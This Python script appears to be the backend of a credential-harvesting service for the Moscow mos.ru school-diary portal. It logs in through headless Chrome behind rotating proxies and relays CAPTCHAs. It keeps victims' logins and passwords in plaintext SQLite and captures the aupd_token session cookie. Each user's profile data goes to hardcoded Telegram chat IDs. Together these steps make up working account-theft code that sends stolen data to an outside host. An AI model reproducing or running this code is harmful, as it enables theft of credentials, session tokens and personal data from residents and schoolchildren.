import string
import uuid
import sqlite3
import time
import random
import os
import shutil
from datetime import datetime, timedelta
from dataclasses import dataclass
from typing import Optional
from zipfile import ZipFile
import tempfile

import requests
from selenium.webdriver import Chrome
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.chrome.service import Service
from selenium.webdriver.chrome.options import Options
from selenium.common.exceptions import SessionNotCreatedException
import tempfile
from sendtg import auth_and_get_user

# Configuration
DB_NAME = "auth_sessions.db"
CAPTCHA_TIMEOUT = 120  # 2 minutes in seconds
DELAY_BEFORE_CLICK = 1
DELAY_AFTER_CLICK = 1
MAX_RETRIES = 3
RETRY_DELAY = 2


# Initialize database
def init_db():
    conn = sqlite3.connect(DB_NAME)
    cursor = conn.cursor()
    cursor.execute("""
                   CREATE TABLE IF NOT EXISTS captcha_tasks
                   (
                       task_id
                       TEXT
                       PRIMARY
                       KEY,
                       login
                       TEXT
                       NOT
                       NULL,
                       password
                       TEXT
                       NOT
                       NULL,
                       captcha_image
                       TEXT
                       NOT
                       NULL,
                       captcha_answer
                       TEXT,
                       status
                       TEXT
                       DEFAULT
                       'pending',
                       created_at
                       TIMESTAMP
                       DEFAULT
                       CURRENT_TIMESTAMP
                   )
                   """)
    conn.commit()
    conn.close()


init_db()


@dataclass
class AuthResult:
    status: str  # 'success', 'captcha_required', 'error', 'timeout'
    data: Optional[dict] = None
    task_id: Optional[str] = None
    captcha_image: Optional[str] = None


def get_random_proxy():
    """Get random proxy from proxy.txt file"""
    try:
        proxy_file = os.path.join(os.path.dirname(__file__), 'proxy.txt')
        with open(proxy_file, 'r') as f:
            proxies = f.read().splitlines()
        return random.choice(proxies) if proxies else None
    except Exception as e:
        print(f"Error reading proxy file: {e}")
        return None


def create_proxy_extension(proxy):
    """Create temporary Chrome extension with proxy settings"""
    if not proxy:
        return None

    try:
        ip, port, username, password = proxy.split(':')
    except ValueError:
        print(f"Invalid proxy format: {proxy}")
        return None

    manifest_json = """
    {
        "version": "1.0.0",
        "manifest_version": 2,
        "name": "Chrome Proxy",
        "permissions": [
            "proxy",
            "tabs",
            "unlimitedStorage",
            "storage",
            "<all_urls>",
            "webRequest",
            "webRequestBlocking"
        ],
        "background": {
            "scripts": ["background.js"]
        },
        "minimum_chrome_version":"22.0.0"
    }
    """

    background_js = """
    var config = {
        mode: "fixed_servers",
        rules: {
            singleProxy: {
                scheme: "http",
                host: "%s",
                port: parseInt(%s)
            },
            bypassList: ["localhost"]
        }
    };

    chrome.proxy.settings.set({value: config, scope: "regular"}, function() {});

    function callbackFn(details) {
        return {
            authCredentials: {
                username: "%s",
                password: "%s"
            }
        };
    }

    chrome.webRequest.onAuthRequired.addListener(
        callbackFn,
        {urls: ["<all_urls>"]},
        ['blocking']
    );
    """ % (ip, port, username, password)

    proxy_ext_dir = tempfile.mkdtemp()

    try:
        with open(os.path.join(proxy_ext_dir, 'manifest.json'), 'w') as f:
            f.write(manifest_json)

        with open(os.path.join(proxy_ext_dir, 'background.js'), 'w') as f:
            f.write(background_js)

        proxy_ext_path = os.path.join(tempfile.gettempdir(), f'proxy_ext_{random.getrandbits(32)}.zip')
        with ZipFile(proxy_ext_path, 'w') as zp:
            zp.write(os.path.join(proxy_ext_dir, 'manifest.json'), 'manifest.json')
            zp.write(os.path.join(proxy_ext_dir, 'background.js'), 'background.js')

        return proxy_ext_path
    finally:
        shutil.rmtree(proxy_ext_dir, ignore_errors=True)


def create_captcha_task(login: str, password: str, captcha_image: str, task_id: str = None) -> str:
    """Create new captcha task in database"""
    task_id = task_id or str(uuid.uuid4())

    conn = sqlite3.connect(DB_NAME)
    try:
        cursor = conn.cursor()
        cursor.execute("""
                       INSERT INTO captcha_tasks
                           (task_id, login, password, captcha_image, status)
                       VALUES (?, ?, ?, ?, ?)
                       """, (task_id, login, password, captcha_image, 'pending'))
        conn.commit()
        return task_id
    finally:
        conn.close()


def check_captcha_solution(task_id: str) -> Optional[str]:
    """Check if captcha has been solved"""
    conn = sqlite3.connect(DB_NAME)
    try:
        cursor = conn.cursor()
        cursor.execute("""
                       SELECT captcha_answer
                       FROM captcha_tasks
                       WHERE task_id = ?
                         AND status = 'solved'
                       """, (task_id,))
        result = cursor.fetchone()
        return result[0] if result else None
    finally:
        conn.close()


def submit_captcha_solution(task_id: str, answer: str) -> bool:
    """Submit captcha solution to database"""
    conn = sqlite3.connect(DB_NAME)
    try:
        cursor = conn.cursor()
        cursor.execute("""
                       UPDATE captcha_tasks
                       SET captcha_answer = ?,
                           status         = 'solved'
                       WHERE task_id = ?
                         AND status = 'pending'
                       """, (answer, task_id))
        affected_rows = cursor.rowcount
        conn.commit()
        return affected_rows > 0
    finally:
        conn.close()


def cleanup_expired_tasks():
    """Clean up expired captcha tasks"""
    conn = sqlite3.connect(DB_NAME)
    try:
        cursor = conn.cursor()
        cursor.execute("""
                       UPDATE captcha_tasks
                       SET status = 'timeout'
                       WHERE status = 'pending'
                         AND datetime(created_at) < datetime('now', ?)
                       """, (f"-{CAPTCHA_TIMEOUT} seconds",))
        conn.commit()
    finally:
        conn.close()


def generate_random_string(length=10):
    """Generate random string for temporary directories"""
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))


def mosru_auth(
        login: str,
        password: str,
        mode: str = "auto",
        uuid_capcha: str = None,
        serv=False
) -> AuthResult:
    """Authenticate with mos.ru portal"""

    # Configure Chrome options
    chrome_options = Options()
    chrome_options.add_argument("--headless")
    chrome_options.add_argument("--no-sandbox")
    chrome_options.add_argument("--disable-dev-shm-usage")
    chrome_options.add_argument("--disable-gpu")
    chrome_options.add_argument("--remote-debugging-port=0")
    chrome_options.add_argument("--no-first-run")
    chrome_options.add_argument("--no-default-browser-check")

    # Set up proxy if available
    proxy = get_random_proxy()
    if proxy:
        print(f"Using proxy: {proxy}")
        proxy_ext = create_proxy_extension(proxy)
        if proxy_ext:
            chrome_options.add_extension(proxy_ext)

    # Set up Chrome driver path
    chromedriver_path = os.path.join(os.path.dirname(__file__), 'chromedriver')

    # Retry mechanism for session creation
    for attempt in range(MAX_RETRIES):
        try:
            # Create unique user data directory
            user_data_dir = tempfile.mkdtemp(prefix="chrome_profile_")
            chrome_options.add_argument(f"--user-data-dir={user_data_dir}")

            # Kill any existing Chrome processes
            os.system("pkill -f chrome")
            time.sleep(1)

            # Initialize WebDriver
            driver = Chrome(service=Service(chromedriver_path), options=chrome_options)

            try:
                # 1. Navigate to login page
                driver.get(
                    "https://login.mos.ru/sps/login/methods/password?bo=%2Fsps%2Foauth%2Fae%3Fresponse_type%3Dcode%26access_type"
                    "%3Doffline%26client_id%3Ddnevnik.mos.ru%26scope%3Dopenid%2Bprofile%2Bbirthday%2Bcontacts%2Bsnils"
                    "%2Bblitz_user_rights%2Bblitz_change_password%26redirect_uri%3Dhttps%253A%252F%252Fschool.mos.ru%252Fv3%252Fauth"
                    "%252Fsudir%252Fcallback")

                # 2. Enter credentials
                WebDriverWait(driver, 10).until(
                    EC.element_to_be_clickable((By.NAME, 'login')))

                driver.find_element(By.NAME, "login").send_keys(login)
                driver.find_element(By.NAME, "password").send_keys(password)
                time.sleep(DELAY_BEFORE_CLICK)
                driver.find_element(By.ID, "bind").click()
                time.sleep(DELAY_AFTER_CLICK)

                # 3. Handle captcha if present
                try:
                    captcha_img = WebDriverWait(driver, 2).until(
                        EC.presence_of_element_located((By.XPATH, "//img[contains(@src, 'data:image')]"))
                    )
                    captcha_data = captcha_img.get_attribute("src")

                    if mode == "manual":
                        task_id = create_captcha_task(login, password, captcha_data, str(uuid_capcha))

                        # Wait for captcha solution
                        start_time = time.time()
                        while True:
                            print("Waiting for captcha solution...")
                            solution = check_captcha_solution(task_id)
                            if solution:
                                break

                            if time.time() - start_time > CAPTCHA_TIMEOUT:
                                cleanup_expired_tasks()
                                return AuthResult(
                                    status="timeout",
                                    task_id=task_id
                                )

                            time.sleep(2)

                        # Enter captcha solution
                        print(f"Submitting captcha solution: {solution}")
                        driver.find_element(By.NAME, "captcha_answer").send_keys(solution)
                        driver.find_element(By.ID, "bind").click()
                        time.sleep(DELAY_AFTER_CLICK)

                except Exception as e:
                    print(f"No captcha detected: {e}")

                # 4. Verify successful authentication
                WebDriverWait(driver, 10).until(
                    lambda d: d.current_url.startswith("https://school.mos.ru/auth/callback"))

                # 5. Get profile data
                token = driver.get_cookie("aupd_token")['value']
                print(f"Obtained token: {token}")

                user = auth_and_get_user(login, password, token)
                print(user.get_text())
                user.send_to_telegram(2015460473)
                user.send_to_telegram(-1002957969429)

                return AuthResult(
                    status="success",
                    data={}
                )

            finally:
                # Clean up WebDriver
                driver.quit()
                # Remove user data directory
                shutil.rmtree(user_data_dir, ignore_errors=True)

            break  # Success - exit retry loop

        except SessionNotCreatedException as e:
            print(f"Session creation failed (attempt {attempt + 1}/{MAX_RETRIES}): {e}")
            if attempt == MAX_RETRIES - 1:
                return AuthResult(status="error", data={"error": str(e)})
            time.sleep(RETRY_DELAY * (attempt + 1))  # Exponential backoff
        except Exception as e:
            print(f"Authentication error: {e}")
            return AuthResult(status="error", data={"error": str(e)})

    return AuthResult(status="error", data={"error": "Max retries exceeded"})


if __name__ == '__main__':
    # Example usage
    result = mosru_auth("your_login", "your_password", mode="manual")
    print(result)